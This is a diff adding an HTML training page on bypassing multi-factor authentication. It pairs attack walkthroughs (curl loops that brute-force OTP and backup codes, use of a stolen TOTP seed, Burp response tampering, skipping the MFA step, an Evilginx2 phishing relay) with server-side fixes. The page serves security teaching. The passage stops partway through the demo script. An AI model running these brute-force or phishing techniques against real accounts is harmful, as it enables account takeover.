@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>MFA Bypass</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+<h1>MFA Bypass</h1>
+<p class="sub">Authentication Design Flaws · CWE-287 · Multi-factor authentication raises the bar — but implementation gaps let attackers step right over it</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">Overview</button>
+  <button class="tab-btn" onclick="showTab('code',this)">Code/OTP bypasses</button>
+  <button class="tab-btn" onclick="showTab('flow',this)">Flow logic flaws</button>
+  <button class="tab-btn" onclick="showTab('social',this)">Social attacks</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- OVERVIEW -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">MFA adds a second factor — something you have (TOTP app, hardware key) or something you are (biometric) — to complement the password. It dramatically raises the cost of account takeover. But bad implementations introduce gaps that let attackers bypass the factor entirely, without touching the code itself.</p>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;margin-bottom:12px;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:8px;">MFA factor types — attack resistance spectrum</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;">
+      <div style="background:#3a1515;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#f87171;margin-bottom:3px;">SMS OTP</div>
+        <div style="font-size:11px;color:#888;">SIM swap, SS7 hijack, phishing. Weakest factor.</div>
+      </div>
+      <div style="background:#2a1a08;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#fbbf24;margin-bottom:3px;">Email OTP</div>
+        <div style="font-size:11px;color:#888;">Email account compromise. Better than SMS but still phishable.</div>
+      </div>
+      <div style="background:#2a1a08;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#fbbf24;margin-bottom:3px;">TOTP (Google Auth)</div>
+        <div style="font-size:11px;color:#888;">Real-time phishing (AiTM), seed backup theft. Moderate resistance.</div>
+      </div>
+      <div style="background:#0f2a1a;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#4ade80;margin-bottom:3px;">Push notification</div>
+        <div style="font-size:11px;color:#888;">MFA fatigue bombing. Strong when used correctly.</div>
+      </div>
+      <div style="background:#0f2a1a;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#4ade80;margin-bottom:3px;">Hardware key (FIDO2)</div>
+        <div style="font-size:11px;color:#888;">Phishing-resistant by design — binds to origin. Strongest available.</div>
+      </div>
+    </div>
+  </div>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:6px;">Attack categories</div>
+    <div class="grid2" style="gap:8px;">
+      <div style="font-size:11px;color:#888;line-height:2;">
+        <span style="color:#f87171;">&#9679;</span> OTP brute force (no rate limit on code entry)<br>
+        <span style="color:#f87171;">&#9679;</span> Flow bypass (skip MFA step entirely via URL)<br>
+        <span style="color:#f87171;">&#9679;</span> Response manipulation (change "fail" to "success")<br>
+        <span style="color:#f87171;">&#9679;</span> Backup code abuse (weak codes, no rate limit)
+      </div>
+      <div style="font-size:11px;color:#888;line-height:2;">
+        <span style="color:#fbbf24;">&#9679;</span> AiTM phishing (real-time session relay)<br>
+        <span style="color:#fbbf24;">&#9679;</span> MFA fatigue (push bombing)<br>
+        <span style="color:#fbbf24;">&#9679;</span> SIM swap (take over phone number)<br>
+        <span style="color:#fbbf24;">&#9679;</span> SS7 hijack (intercept SMS at telecom level)
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CODE / OTP BYPASSES -->
+<div class="tab-panel" id="tab-code">
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9312; OTP brute force — no rate limit</span><span class="badge b-red">Critical</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">A 6-digit TOTP has 1,000,000 possible values. If there is no rate limit or lockout on the code entry endpoint, an attacker with a valid password can brute force it in under a second via automation.</p>
+    <div class="code"># 6-digit SMS/TOTP: 000000–999999 = 1,000,000 values
+# With no rate limit:
+for code in $(seq -w 0 999999); do
+  curl -s -X POST https://target.com/verify-mfa \
+    -d "code=$code&session=VICTIM_SESSION" | grep -i "success"
+done
+
+# GraphQL batching bypass (from API Security module):
+mutation {
+  a1: verifyMFA(code: "000000") { success }
+  a2: verifyMFA(code: "000001") { success }
+  ...all 1M codes in one request...
+}
+
+# TOTP window: typically 30-second window, server often accepts
+# current AND previous code → effectively 2 valid codes at any time
+# HOTP (counter-based): no time window → longer attack window</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9313; Backup codes — weak generation or no rate limit</span><span class="badge b-red">High</span>
+    </div>
+    <div class="code"># Backup codes are often:
+# - Short (6-8 characters) vs TOTP's 6 digits
+# - Stored in plaintext in DB (leaked in breach)
+# - Not rate-limited (separate endpoint from main MFA)
+# - Reusable after "recovery" (some apps regenerate same codes)
+
+# Test: does the backup code endpoint have rate limiting?
+for code in AAAA1111 AAAA1112 AAAA1113 ...; do
+  POST /account/recovery  backup_code=$code
+done
+
+# Also: check if backup codes are displayed in HTML source,
+# stored in localStorage, or sent in a cookie</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9314; TOTP seed backup exposure</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># When setting up TOTP, the app shows a QR code containing the seed secret
+# Format: otpauth://totp/Service:user@example.com?secret=BASE32SECRET
+
+# If the secret is:
+# - Stored in plaintext in DB → leaked in breaches
+# - Transmitted without HTTPS
+# - Cached in browser after setup page
+# - Exposed in an IDOR (GET /api/users/OTHER_ID/totp-seed)
+
+# With the seed, attacker generates all past and future codes:
+import pyotp
+totp = pyotp.TOTP("STOLEN_BASE32_SECRET")
+print(totp.now())   # current valid code — always
+# MFA provides zero additional protection once seed is stolen</div>
+  </div>
+</div>
+
+<!-- FLOW LOGIC FLAWS -->
+<div class="tab-panel" id="tab-flow">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">The most impactful MFA bypasses don't touch the OTP at all — they exploit logic flaws in the authentication flow itself.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9312; Direct endpoint access — skip MFA step</span><span class="badge b-red">Critical</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">MFA creates a "pending authentication" state between password verification and code verification. If the app doesn't properly enforce that MFA was completed, navigating directly to the post-login page may work.</p>
+    <div class="code"># Normal flow:
+# GET /login → POST /login (pass) → GET /mfa → POST /mfa (code) → GET /dashboard
+
+# Attack: after step 2 (password accepted), skip step 4:
+# 1. POST /login → success, session marked "password_verified"
+# 2. SKIP the MFA page entirely
+# 3. GET /dashboard directly
+# → If app only checks "password_verified" flag and not "mfa_verified": BYPASSED!
+
+# Also test:
+GET /account/settings   (usually requires full auth — skippable?)
+GET /api/v1/profile     (API might have weaker MFA enforcement than web UI)
+GET /dashboard?skip_mfa=true   (parameter manipulation)</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9313; Response manipulation — change false to true</span><span class="badge b-red">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">If MFA verification trusts a client-side response, intercepting and modifying it with Burp can bypass the check entirely.</p>
+    <div class="code"># Submit wrong MFA code — intercept the response in Burp:
+POST /verify-mfa  code=000000
+→ HTTP 200: {"success": false, "message": "Invalid code"}
+
+# Modify response before browser processes it:
+{"success": true, "message": "Code verified"}  ← changed!
+
+# If app redirects based on the JSON response body
+# rather than server-side session state → bypass!
+
+# Also: change HTTP status code
+# 401 → 200 in response → app treats as success
+
+# Proper implementation: server MUST update session state on its side
+# Client response is only informational — never trusted for access control</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9314; Password reset bypasses MFA</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># MFA on login, but password reset flow skips MFA check:
+# 1. Request password reset for victim's email
+# 2. Attacker has access to victim's email (phished, compromised)
+# 3. Click reset link → set new password
+# 4. Log in with new password → MFA required
+# 5. BUT: if victim has SMS MFA and attacker did SIM swap → bypass complete
+
+# Also test:
+# - Does password reset invalidate active sessions? (logout all devices)
+# - Does account recovery bypass MFA entirely?
+# - Does "trusted device" survive password reset?
+
+# "Remember this device" abuse:
+# If device trust token is predictable or not tied to account:
+# Attacker steals or guesses device token → MFA skipped on "trusted" device</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9315; Cross-account OTP usage</span><span class="badge b-purple">Medium</span>
+    </div>
+    <div class="code"># Attacker has their own account with MFA enabled
+# App doesn't bind OTP verification to a specific user session
+
+# Attack:
+# 1. Attacker logs in with victim's password (from breach/guess)
+# 2. MFA prompt appears for victim's account
+# 3. Attacker submits a valid OTP from THEIR OWN authenticator app
+# 4. If server only checks "is this a valid OTP in the current window?"
+#    without checking "is this OTP for THIS user?" → bypass!
+
+# The OTP must be tied to: specific user + specific session + used only once</div>
+  </div>
+</div>
+
+<!-- SOCIAL ATTACKS -->
+<div class="tab-panel" id="tab-social">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Technical MFA bypasses aside — social and infrastructure attacks often reach around MFA entirely.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">AiTM (Adversary-in-the-Middle) phishing — real-time relay</span><span class="badge b-red">Bypasses TOTP completely</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Tools like Evilginx2 and Modlishka create a reverse proxy that sits between the victim and the real site. The victim enters their real password AND their real OTP — the proxy captures the session cookie instantly.</p>
+    <div class="code"># Evilginx2 setup (educational overview):
+# 1. Point a phishing domain to Evilginx2 proxy
+# 2. Victim visits: accounts.google.phishing-domain.com
+# 3. Proxy relays to REAL accounts.google.com in real-time
+# 4. Victim sees legitimate Google login page
+# 5. Victim enters password → relayed to real Google → real MFA prompt returned
+# 6. Victim enters TOTP → relayed to real Google → session cookie issued
+# 7. Proxy captures the session cookie BEFORE passing it to victim
+
+# Result: attacker has a valid, authenticated session cookie
+# TOTP was correctly entered by the victim — it doesn't matter!
+# The session cookie is what was stolen
+
+# Countermeasure: ONLY FIDO2/WebAuthn hardware keys are phishing-resistant
+# WebAuthn binds the credential to the origin URL — phishing domain ≠ real domain
+# Even if victim enters password on phishing site, the key won't work there</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">MFA fatigue — push notification bombing</span><span class="badge b-red">High — social engineering</span>
+    </div>
+    <div class="code"># Attack on push-based MFA (Microsoft Authenticator, Duo Push):
+# 1. Attacker has valid credentials (from breach/phish)
+# 2. Attacker triggers login repeatedly → flood of push notifications to victim
+# 3. At 2 AM, victim wakes to 50 "Approve login?" notifications
+# 4. Victim accidentally or frustratedly taps "Approve"
+# 5. Attacker is in.
+
+# Real-world examples:
+# - Uber breach (2022): attacker pushed MFA for hours, then WhatsApp-messaged
+#   victim claiming to be IT support → victim approved
+# - Rockstar Games breach (2022): similar technique
+
+# Mitigations:
+# - Number matching: push shows "Enter 42 from app" → defeats fat-finger approvals
+# - Additional context: push shows location + device → anomaly visible
+# - Rate limit push notifications (max 3 per 10 minutes)
+# - "Deny and report" button that triggers security alert</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">SIM swap &amp; SS7 attacks — SMS MFA bypass</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># SIM swap: social engineering the carrier
+# Attacker calls carrier, impersonates victim → transfers number to attacker's SIM
+# All SMS to victim's number now go to attacker
+# → Receive SMS OTP → bypass MFA
+
+# Real targets: high-value accounts (crypto exchanges, executives)
+# Success rate: varies — some carriers have stronger verification
+
+# SS7 (Signaling System 7) attack:
+# Exploits decades-old telecom protocol vulnerabilities
+# Can intercept SMS without the carrier's cooperation
+# Requires access to SS7 network (telecom insider or nation-state)
+
+# Why SMS MFA is still better than nothing:
+# Raises attack cost significantly for most threats
+# But: for high-value targets, SMS MFA should be replaced with TOTP or FIDO2
+
+# NIST SP 800-63B: SMS OTP is "restricted" — not recommended for new implementations
+# But: still far better than password-only!</div>
+  </div>
+</div>
+
+<!-- DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate MFA bypass scenarios — each showing the attack technique, what the vulnerable implementation does, and what a hardened one does instead.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">Bypass scenario</div>
+    <select id="mfa-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="bruteforce">OTP brute force — no rate limit</option>
+      <option value="skipstep">Flow bypass — navigate directly to dashboard</option>
+      <option value="response">Response manipulation — change false to true</option>
+      <option value="backup">Backup code brute force</option>
+      <option value="aitm">AiTM phishing — real-time relay</option>
+    </select>
+  </div>
+
+  <div style="margin-bottom:8px;">
+    <div class="chip">Attack setup &amp; execution</div>
+    <div class="mono-out" id="attack-out" style="min-height:80px;"></div>
+  </div>
+
+  <div class="grid2">
+    <div><div class="chip">Vulnerable server behaviour</div><div class="mono-out" id="vuln-out" style="min-height:110px;"></div></div>
+    <div><div class="chip">Secure server behaviour</div><div class="mono-out" id="safe-out" style="min-height:110px;"></div></div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Rate limit and lockout on OTP entry <span class="badge b-red">Fixes brute force</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">The OTP endpoint needs the same — or stricter — rate limiting as the password endpoint. After 5 failures, lock the MFA session and require re-authentication.</div>
+    <div class="code">## Express.js — OTP rate limiter
+const otpLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,  // 15 minutes
+  max: 5,                      // 5 attempts
+  keyGenerator: (req) => req.session.userId || req.ip,
+  handler: (req, res) => {
+    // Invalidate the pending auth session
+    req.session.pendingMFA = false;
+    req.session.userId = null;
+    res.status(429).json({
+      error: 'Too many attempts — please log in again'
+    });
+  }
+});
+app.post('/verify-mfa', otpLimiter, verifyMFAHandler);
+
+// Also: codes are single-use — mark as used after verification
+// Store used codes in cache for the TOTP window duration</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; Enforce MFA completion server-side — explicit state machine <span class="badge b-green">Fixes flow bypass</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Use an explicit three-state session model: anonymous → password_verified → fully_authenticated. Every protected endpoint checks for the fully_authenticated state. No skipping steps.</div>
+    <div class="code">// Session states (server-side only — never trust client)
+const AUTH_STATES = {
+  ANONYMOUS:          0,
+  PASSWORD_VERIFIED:  1,  // password OK, MFA pending
+  FULLY_AUTHENTICATED: 2  // MFA complete — full access
+};
+
+// Middleware — protect all routes
+function requireFullAuth(req, res, next) {
+  if (req.session.authState !== AUTH_STATES.FULLY_AUTHENTICATED) {
+    return res.status(401).redirect('/login');
+  }
+  next();
+}
+
+// Login flow
+app.post('/login', async (req, res) => {
+  if (await checkPassword(req.body)) {
+    req.session.authState = AUTH_STATES.PASSWORD_VERIFIED;
+    req.session.pendingUserId = user.id;  // NOT logged in yet
+    res.redirect('/mfa');
+  }
+});
+
+app.post('/verify-mfa', otpLimiter, (req, res) => {
+  if (verifyOTP(req.body.code, req.session.pendingUserId)) {
+    req.session.authState = AUTH_STATES.FULLY_AUTHENTICATED;
+    req.session.userId = req.session.pendingUserId;
+    res.redirect('/dashboard');
+  }
+});</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Bind OTP to user and session — single use <span class="badge b-green">Fixes cross-account reuse</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Verify the OTP against the specific user who is being authenticated, in the specific session. Mark it as used immediately to prevent replay.</div>
+    <div class="code">## Python — TOTP verification with user binding
+import pyotp, redis
+
+def verify_totp(user_id, code, session_id):
+    # Get user's specific TOTP secret (not any user's secret)
+    secret = db.get_totp_secret(user_id)
+    totp = pyotp.TOTP(secret)
+
+    # Check single-use: has this code been used in this window?
+    cache_key = f"used_otp:{user_id}:{totp.timecode(time.time())}"
+    if redis.get(cache_key):
+        raise ValueError("Code already used")
+
+    if not totp.verify(code, valid_window=1):
+        raise ValueError("Invalid code")
+
+    # Mark as used for this time window
+    redis.setex(cache_key, 60, "1")
+    return True</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; Push MFA: enable number matching &amp; context <span class="badge b-amber">Fixes fatigue attacks</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Number matching requires the user to enter a number shown on the login screen into the authenticator app — impossible to approve accidentally or without seeing the screen. Add location context so anomalies are visible.</div>
+    <div class="code">## Microsoft Entra (Azure AD) — enable number matching
+# Admin center → Security → Authentication methods → Microsoft Authenticator
+# → Configure → Number matching: Enabled
+
+## Additional context in push:
+# "Approve sign-in from Seattle, WA on Windows device?"
+# Victim seeing "Sign-in from Lagos, Nigeria" will likely deny
+
+## Rate limit pushes:
+# Max 3 push notifications per 10-minute window
+# After 3 denials: require re-authentication with different factor
+
+## "Report suspicious activity" button:
+# Deny + alert the security team immediately</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9316; FIDO2 / WebAuthn — phishing-resistant MFA <span class="badge b-green">Ultimate defence</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">WebAuthn hardware keys (YubiKey, passkeys) are cryptographically bound to the origin. An AiTM phishing proxy on a different domain cannot complete the WebAuthn flow — even if the victim is deceived.</div>
+    <div class="code">## Registration (server-side, simplified)
+const options = await generateRegistrationOptions({
+  rpName: 'My App',
+  rpID: 'app.example.com',       // ← bound to this exact origin
+  userID: user.id,
+  userName: user.email,
+  attestationType: 'none',
+  authenticatorSelection: {
+    residentKey: 'preferred',
+    userVerification: 'preferred',
+  },
+});
+
+## Authentication
+const options = await generateAuthenticationOptions({ rpID: 'app.example.com' });
+// Browser sends challenge to authenticator
+// Authenticator signs with private key ONLY IF rpID matches current origin
+// phishing-domain.com !== app.example.com → key refuses to sign → attack fails
+
+## Libraries: @simplewebauthn/server (Node), python-fido2 (Python)</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9317; MFA security checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Rate limit OTP attempts — max 5 per 15 minutes per session &nbsp;·&nbsp;
+      Explicit server-side auth state machine — MFA completion checked on every request &nbsp;·&nbsp;
+      OTPs are single-use and bound to specific user + session &nbsp;·&nbsp;
+      No response-manipulation bypass — access decisions made server-side only &nbsp;·&nbsp;
+      Push MFA: enable number matching + context to defeat fatigue &nbsp;·&nbsp;
+      Replace SMS MFA with TOTP or FIDO2 for sensitive accounts &nbsp;·&nbsp;
+      Password reset flow must not bypass MFA &nbsp;·&nbsp;
+      "Remember device" tokens must be unpredictable, bound to user, and expiring &nbsp;·&nbsp;
+      For highest-security accounts: enforce FIDO2 hardware keys (phishing-resistant)
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const DEMOS={
+  bruteforce:{
+    atk:`# 6-digit TOTP — 1,000,000 possible codes
+# No rate limit on /verify-mfa endpoint
+
+for code in $(seq -w 0 999999); do
+  RESP=$(curl -s -X POST https://target.com/verify-mfa \\
+    -b "session=VICTIM_PENDING_SESSION" \\
+    -d "otp=$code")
+  if echo "$RESP" | grep -q "success"; then
+    echo "FOUND: $code"; break
+  fi
+done`,
+    vuln:`[attempt 000000] POST /verify-mfa → {"success":false}
+[attempt 000001] POST /verify-mfa → {"success":false}
+...
+[attempt 482910] POST /verify-mfa → {"success":true}
+                                     "redirect":"/dashboard"
+
+Total time: ~8 minutes (100 req/sec)
+No lockout. No rate limit. Full account access.`,
+    safe:`[attempt 1] POST /verify-mfa → 200 Invalid
+[attempt 2] POST /verify-mfa → 200 Invalid
+[attempt 3] POST /verify-mfa → 200 Invalid
+[attempt 4] POST /verify-mfa → 200 Invalid
+[attempt 5] POST /verify-mfa → 429 Too Many Attempts
+
+Session invalidated. Must re-authenticate.
+Attacker must redo login step + bypass rate
+limit there too. Attack impractical.`,
+    verdict:'<strong>OTP brute forced in 8 minutes!</strong> With no rate limiting on the MFA endpoint, all 1,000,000 TOTP codes were tryable in minutes. The secure server locks after 5 attempts and invalidates the pending session, requiring the attacker to restart the entire login flow.'
+  },
+  skipstep:{
+    atk:`# After submitting correct password (step 1 of 2):
+# Server redirects to: GET /mfa-verify
+# Session state: {passwordVerified: true, mfaVerified: false}
+
+# Attacker skips the MFA page entirely:
+GET /dashboard
+Cookie: session=PENDING_SESSION_AFTER_PASSWORD
+
+# App only checks: req.session.passwordVerified === true
+# Never checks: req.session.mfaVerified === true`,
+    vuln:`GET /dashboard HTTP/1.1
+Cookie: session=PENDING_SESSION
+
+HTTP 200 OK
+Welcome back, Alice! Here's your account...
+
+# Server checked passwordVerified flag
+# Never checked mfaVerified flag
+# MFA step bypassed completely by navigation!
+
+# Also works: /api/v1/account, /settings, /admin
+# API layer often has weaker MFA enforcement than UI`,
+    safe:`GET /dashboard HTTP/1.1
+Cookie: session=PENDING_SESSION
+
+HTTP 302 Found
+Location: /mfa-verify
+
+# Server checks: req.session.authState === FULLY_AUTHENTICATED
+# Session state is only PASSWORD_VERIFIED
+# Redirected back to MFA step regardless of URL
+
+# Every protected route uses requireFullAuth() middleware
+# Cannot skip any step in the state machine`,
+    verdict:'<strong>MFA bypassed by navigating directly to the dashboard!</strong> The server only checked the password-verified flag, not a separate MFA-verified flag. Fix: use an explicit three-state auth model (anonymous → password_verified → fully_authenticated) and check for fully_authenticated on every protected endpoint.'
+  },
+  response:{
+    atk:`# Submit incorrect OTP — intercept response in Burp:
+POST /verify-mfa
+otp=000000  ← wrong code
+
+Burp intercepts RESPONSE before browser sees it:
+{"success": false, "message": "Invalid OTP"}
+
+# Modify response in Burp Proxy:
+{"success": true, "message": "OTP verified"}
+
+# Forward modified response to browser`,
+    vuln:`# Vulnerable client-side JS:
+fetch('/verify-mfa', {method:'POST', body: formData})
+  .then(r => r.json())
+  .then(data => {
+    if (data.success) {
+      window.location = '/dashboard';  // trusts JSON response!
+    }
+  });
+
+# Browser receives modified "success:true"
+# Redirects to /dashboard
+# Server's actual session state: mfaVerified = false
+# But server trusts the redirect without re-checking!`,
+    safe:`# Secure server-side flow:
+POST /verify-mfa → code verified server-side
+  → session.authState = FULLY_AUTHENTICATED (server-side)
+  → HTTP 302 redirect to /dashboard
+
+# On /dashboard:
+  requireFullAuth middleware checks session state
+  session.authState is still PASSWORD_VERIFIED (not changed by manipulated response)
+  → HTTP 302 back to /mfa-verify
+
+# Client JS is irrelevant — server controls redirects
+# No amount of response manipulation changes server session state`,
+    verdict:'<strong>MFA bypassed by response manipulation!</strong> The app trusted the JSON response body to decide whether to redirect. Burp changed "success:false" to "success:true" — the browser redirected to the dashboard. Fix: access decisions must be made server-side. The server should redirect on success, not the client based on a JSON flag.'
+  },
+  backup:{
+    atk:`# Backup codes: 8 alphanumeric chars = 36^8 = ~2.8 trillion possibilities
+# But most apps generate only ~10 codes, often stored in plaintext
+
+# Check: does backup code endpoint have rate limiting?
+for code in $(cat common_backup_codes.txt); do
+  curl -s -X POST https://target.com/account/recovery \\
+    -d "backup_code=$code&email=victim@corp.com" \\
+    | grep -i "success\\|invalid"
+done
+
+# If from DB breach: backup codes stored in plaintext
+# Leaked: code1=abc12345, code2=def67890 → direct use`,
+    vuln:`POST /account/recovery
+backup_code=abc12345
+
+HTTP 200 OK
+{"success": true, "message": "Recovery successful"}
+Set-Cookie: session=NEW_AUTHENTICATED_SESSION
+
+# No rate limit on recovery endpoint
+# Backup code accepted → full account access
+# MFA completely bypassed via recovery path`,
+    safe:`[attempt 1] POST /recovery → 200 Invalid
+[attempt 2] POST /recovery → 200 Invalid
+[attempt 3] POST /recovery → 429 Rate Limited
+
+After 3 failed recovery attempts:
+Account locked. Email alert sent to victim.
+Security team notified.
+
+Backup codes: hashed in DB (not plaintext)
+→ Even DB breach doesn't expose them directly`,
+    verdict:'<strong>MFA bypassed via unprotected backup codes!</strong> The recovery endpoint had no rate limiting — a common oversight since it\'s treated as an edge case. Backup codes should: be rate-limited just like OTP, hashed in the database (bcrypt), single-use, and trigger a security alert on use.'
+  },
+  aitm:{
+    atk:`# Evilginx2 / AiTM proxy setup:
+# 1. Domain: accounts.google.phishingdomain.com
+# 2. Proxy transparently relays to real accounts.google.com
+
+# Victim receives phishing email:
+"Your account needs verification: https://accounts.google.phishingdomain.com"
+
+# Victim enters real credentials + real TOTP:
+# All relayed to real Google in real-time
+# Google accepts valid password + valid TOTP → issues session cookie`,
+    vuln:`# Proxy captures session cookie:
+Set-Cookie: GOOGLE_SESSION=abc...xyz; Secure; HttpOnly
+
